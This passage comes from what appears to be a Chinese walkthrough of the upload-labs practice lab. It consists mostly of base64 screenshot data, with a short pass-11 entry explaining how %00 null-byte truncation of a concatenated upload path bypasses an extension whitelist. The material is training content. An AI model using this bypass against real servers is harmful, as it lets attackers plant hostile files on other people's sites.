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" alt="img"></p>
<h5 id="pass-11"><a href="#pass-11" class="headerlink" title="pass-11"></a>pass-11</h5><p>使用白名单只允许特定后缀 白名单判断，使用jpg格式后缀即可,但$img_path是直接拼接，因此可以利用%00截断,利用创建路径的函数修改文件名和后缀%00在解码后是空字符<img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAzsAAAAoCAYAAADZheSHAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAAE/4AABP+AQeUOYQAAA/NSURBVHhe7Z07qyXFFsfnK0xsZjTBhUExElEYQcFkYFQUnEQGBE+g8cUDo5l6TAwG7gnHQLObGggmN5f5DPMB5iv0rcda3fVY9equ2o/e/+AHc3ZXV9er1/r/u3rvuXPvX29NAAAAAAAAALA3YHYAAAAAAAAAuwRmBwAAAAAAALBLYHYAAAAAAAAAuwRmBwAAAAAAALBLYHYAAAAAAAAAuwRmBwAAAAAAALBLYHYAAAAAAAAAuwRmBwAAAAAAALBLYHYAAAAAAAAAuwRmBwAAAAAAALBLYHYAAAAAAAAAuwRmBwAAAAAAALBLDmB27k3/3N6Z/vlMOgb2CeYcADCed69+mW6vvxCPXSyfPcWYGL6Yrm9/ma4eSMdANx58O/188+30rnTsgnh+fWd6dX1PPAaOz3iz8+D16eXt3emvbMCx4vgVBHKEuYFuX5ueC8dOlqo5PwO0aLi99bhOrs/70wc3d6av1Bp+hDU8nHfUffGVui/eEY6lePPqrpmfr5IJ6cPp6saf79utSfyz1+w1b16f3lR/l9vgcm96JJQN67BjcWd6fHXfK3fWPPx7+vy/r6bPn/4oH1cYo5O9Jy+TT65p7Q41PD9O7//2avryt7+nN8Tjx0YbndT9S/eVylEf6Byl8tVj83dbPOnJmngWw/3qkYPqx4jvw82xcibMpUFbxHNKjJ7z+9Nfqs0vizHYltNad0blhh/Ccipv2OMp7bdoZgbaOc8ws/ODSsjuRFjKE3dJE2bHKG8KzsnstM15LRXBYQ4MArNQjINDTNBWMju1YopFJ8zONqyYzye2VeKAjUeV0SDjszWBc1Ils9PUBlNWGIegDjY/F2V29NNkdW/+fPWhfJz4+I9/T//5n+LPTzPz+NH0nS4z88309ROp3Ajqrz33hfjp2XtiOc14I9jB7Fy9mL5Uc/zwSji2EWv4nk6fCMcWMc33FgvhJZ6U7qne91wYz3IxMB37epqd8hh5UK4s3Y+1+Lk0bMsaGvtTi3mwG2sJWceylqnQRLOmqS97/tqZxkcyfx0YYHZ4Qq2INwJ4UOPPnf2YnUFzzjd8WJcOMK5YXHOz15yzyuxsCchAM9rs1AmUsWan3AZKzpIpojpCs7Mrk501O+W5effZN8YQfPc9mYmU2Xny6fSTPv7HR/Nny7lB2d58/yQ2LfSZf22pD/SZ024f3qVMCf6tnLDZKcbthPDle9QrkzEVXvlt9DE7PakZIx9rMPu8NiibnS19bu9PCX64a3ZzjOkpvM1Cxqi8+9PIGv1zkpyb2aGB5wmF2UmzG7MzYs75iUnlE/Dmm73mnEazUyPSQZlhZoeMx0HNDidVXse1baByooEJ61Br+aLMTum+1IZhNgZ5s2N2S6Jj701f/5k+pw90DcGshG2y5uvJ9LFTxmCMUWYXqnL3ax2nanbq7ls/fpAQDoUv3VfhvTri4cLpmZ3KMfKgVwc7vD4Z9r9Hn9v7k4PeFGGdY/RKweys0Sk1jKr34Jy52cl+acssEC3mGWmx2AHQ9bGTtoOxvJYUOeWo3oWobBF7HXMe9Y2RF5fwupTb/0zbGLfexezw7glRYwIORcucV2L7XQgezJqbveacRrNThbquTpQLiQBOgtYt6yfd3NOu1DES3g7rE7aty7Qp6JNcZ3xtb9dC6G+IW++SuLivRLf7opfZWYfp3+pE3AoJ119/V//+fXqoBKgWoQZBzL7x9OVy3PByev+hVObF9DbXnanPQObGr1cyO63zkjM79lj8OhidM/R1ttS1Y3MjGzIF7Uqld6B6ruFgHploPoP1ozHrKnM8IJ7z+NrJ1xu7xmyOLa7piHcEzL2q484cB4O4JMQkG79ClnjdZHai2Jl/UMRmbaZjnMm/PrgnArNj9EThoXSF5pg1LsP15xhVb4FSnfPxcP3PGtjqu6ieiMS40r1e+zBnwGtsrgm5NxsVueyC7XDa7JhO60EzA3V3eqk+05Nrz3MGgybevaYVzo1ieMY1L8t1eIL8OnXZYGKoPZL4T/d5wbT9RvXXvRYtlnbjNop1c56m0eFX3OwRNed0NjviE0GdqIRg8Fj13U1AfK5reMT6NPr8oCx/5iVeNQZhnfW45iVM0mGbdFknOWvo2pIQsHXkE7Y1A3dNn+ZrSf1ezTHNjmMkxeO98cXk/KSdDYgjVrWJ8YUmn+sbHtcQLeVJ6Hril8sGhim5s2OfHtfvVmTMjvTKmDEQyuR8XzISW6F2Sa+hBTs29rs6ws5OxjAx9rs7G18tEueC5t0zO3p+tcHlvxW0exPOuXssv7NDa8a9jrAuGdvfjmI7iJtSbJqNi4nZdO/q2KTvXxPnBLMUxL3QwORiYGR2HEqx054bHFdt7BZrRjwgPFFYV2qd8lyNu6hXSGfkkDVIgwaia6S0TPzgmDV1